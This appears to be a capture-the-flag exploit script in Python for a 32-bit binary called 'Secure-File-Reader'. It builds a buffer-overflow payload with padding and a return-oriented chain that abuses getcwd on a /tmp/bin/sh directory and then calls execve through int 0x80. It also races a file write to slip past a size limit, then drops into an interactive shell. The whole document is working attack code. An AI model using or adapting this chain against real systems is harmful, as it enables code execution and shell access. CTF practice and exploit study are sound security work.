#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = '/root/Workspaces/ndh/Secure-File-Reader/pwn'
elf = ELF(binary)

os.system('mkdir -p /tmp/bin/sh')
os.chdir('/tmp/bin/sh')

payload = cyclic(0x1000) # in fact read: 4096 / 256 * 255 = 4080
payload += cyclic(16)
payload += cyclic(8)
payload += cyclic(4)

payload += p32(0x08070C90) # getcwd
payload += p32(0x08094188) # add esp, 0xc ; ret
payload += p32(0x080F02E0) # buf
payload += p32(0x01ffffff)
payload += cyclic(4)

payload += p32(0x08058af4) # xor eax, eax ; ret
payload += p32(0x080921b2) # add eax, 0xb ; pop edi ; ret
payload += cyclic(4)
payload += p32(0x08072730) # pop edx ; pop ecx ; pop ebx ; ret
payload += p32(0x080C6218) # [NULL]
payload += p32(0x080C6218) # [NULL]
payload += p32(0x080F02E0 + 4) # buf -> /bin/sh
payload += p32(0x08049501) # int 0x80
payload += '\n'

write('/tmp/payload', payload[:0xfff])

io = process([binary, '/tmp/payload'])

time.sleep(0.002)
fp = open('/tmp/payload', 'a')
fp.write(payload[0xfff:])
fp.close()
# write('/tmp/payload', payload)
# io = debug([binary, '/tmp/payload'])
# io.b(0x08094188)
# io.r()
io.interactive()
